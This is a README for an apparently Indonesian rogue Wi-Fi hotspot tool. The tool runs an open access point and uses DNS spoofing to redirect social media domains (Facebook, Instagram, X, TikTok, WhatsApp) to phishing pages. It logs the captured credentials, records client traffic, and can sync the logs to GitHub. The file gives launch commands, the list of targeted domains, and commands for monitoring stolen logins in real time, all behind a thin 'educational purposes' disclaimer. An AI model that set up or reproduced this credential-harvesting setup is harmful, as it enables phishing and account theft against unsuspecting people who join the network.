# 🔥 MZKYZAK HOTSPOT - MASIH TAHAP PERBAIKAN
# 💀 NUMPANG HOTSPOT DATA LO KETAHUAN - RED HACKER 

![MZKYZAK Banner](https://img.shields.io/badge/MZKYZAK-HOTSPOT-red)
![muzaky](https://img.shields.io/badge/mzkyzak-VERIFIED-orange)
![Real-time](https://img.shields.io/badge/REAL--TIME-MONITORING-green)

Professional hotspot system with real-time monitoring, credential capture, and internet sharing for security testing and educational purposes.

## ⚡ FEATURES

- **🌐 Internet Sharing** - Clients get real internet via your ethernet
- **🔴 Real-time Dashboard** - Web dashboard at `http://192.168.1.1/`
- **💀 Credential Capture** - Auto-login credentials from phishing pages
- **📱 Live Monitoring** - See connected clients and traffic in real-time
- **🎯 Smart DNS Spoofing** - Redirects social media to phishing pages
- **📊 GitHub Sync** - Optional sync of logs to GitHub

## 🚀 QUICK START

```bash
# Make scripts executable
chmod +x mzkyzak_realtime_hotspot.sh

# Start the hotspot
./mzkyzak_realtime_hotspot.sh
```

## 📡 HOTSPOT DETAILS

| Parameter | Value |
|-----------|-------|
| SSID | `mzkyzak_hotspot` |
| Security | Open Network (No Password) |
| IP Range | `192.168.1.100-200` |
| Gateway | `192.168.1.1` |
| Dashboard | `http://192.168.1.1/` |

## 🎯 PHISHING TARGETS

The system automatically redirects these domains to phishing pages:
- `facebook.com`, `www.facebook.com`, `fb.com`
- `instagram.com`, `www.instagram.com`
- `twitter.com`, `www.twitter.com`, `x.com`
- `tiktok.com`, `www.tiktok.com`
- `whatsapp.com`, `web.whatsapp.com`

## 📊 MONITORING COMMANDS

```bash
# Live credentials
tail -f /tmp/mzkyzak_credentials.log

# Access log
tail -f /tmp/mzkyzak_access.log

# Connected clients
sudo arp -a | grep wlan0

# Traffic capture
sudo tcpdump -r /tmp/mzkyzak_traffic.pcap

# Web dashboard
# Open: http://192.168.1.1/
```

## 🔧 CONFIGURATION

### Network Interfaces
- **WiFi Interface**: `wlan0` (monitor mode)
- **Ethernet Interface**: Auto-detected (`eth0` or `enpXsX`)
- **Internet Sharing**: Automatic when ethernet is connected

### DNS Configuration
Located in `setup/dnsmasq.conf`:
- Selective spoofing for social media
- Google DNS (`8.8.8.8`) for other sites
- No IPv6 to avoid errors

### Hostapd Configuration
Located in `setup/hostapd_simple.conf`:
- SSID: `mzkyzak_hotspot`
- Channel: 6
- Mode: 802.11g
- Security: Open

## 🛠️ FILES STRUCTURE

```
virus_hospot/
├── README.md                   # This file
├── mzkyzak_realtime_hotspot.sh # Main script (USE THIS)
├── hotspot_final_internet.sh   # Alternative script
├── final_hotspot_perfect.sh    # Standalone version
├── hotspot_pro.py              # Python helper
├── data_logger.py              # Data logging
├── stop_hotspot_asus.sh        # Stop script
├── setup/                      # Configuration files
│   ├── hostapd_simple.conf    # Hostapd config
│   ├── hostapd.conf           # Alternative config
│   └── dnsmasq.conf          # DNS config
└── payloads/                  # Phishing pages
    ├── login_facebook.html
    └── login_instagram.html
```

## 🌐 INTERNET SHARING

The system automatically:
1. Detects your ethernet interface
2. Enables IP forwarding
3. Sets up NAT (Masquerade)
4. Routes client traffic through your internet connection

**Result**: Clients connected to `mzkyzak_hotspot` get real internet access!

## 📈 GITHUB SYNC (Optional)

To sync logs to GitHub:

1. Edit `mzkyzak_realtime_hotspot.sh` line ~350
2. Set your GitHub repo: `GITHUB_REPO="https://github.com/YOUR_USERNAME/mzkyzak-logs.git"`
3. Uncomment the sync section
4. Logs will sync automatically every 60 seconds

## ⚠️ LEGAL DISCLAIMER

**THIS TOOL IS FOR EDUCATIONAL AND SECURITY TESTING PURPOSES ONLY.**

- Use only on networks you own or have permission to test
- Do not use to harm or exploit others
- You are responsible for complying with all applicable laws
- Unauthorized network access is illegal

## 🐛 TROUBLESHOOTING

### Issue: "No internet for clients"
**Solution**: Make sure ethernet is connected and working:
```bash
ping 8.8.8.8
```

### Issue: "wlan0 not found"
**Solution**: Check WiFi adapter:
```bash
iwconfig
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
```

### Issue: "Permission denied"
**Solution**: Run with sudo or check permissions:
```bash
sudo ./mzkyzak_realtime_hotspot.sh
```

## 🔄 UPDATES

For updates and issues, check the GitHub repository.

## 📞 CONTACT

For security testing collaboration or educational purposes.

---
**💀 ZXZBEDST VERIFIED | 🔥 MZKYZAK HOTSPOT SYSTEM**
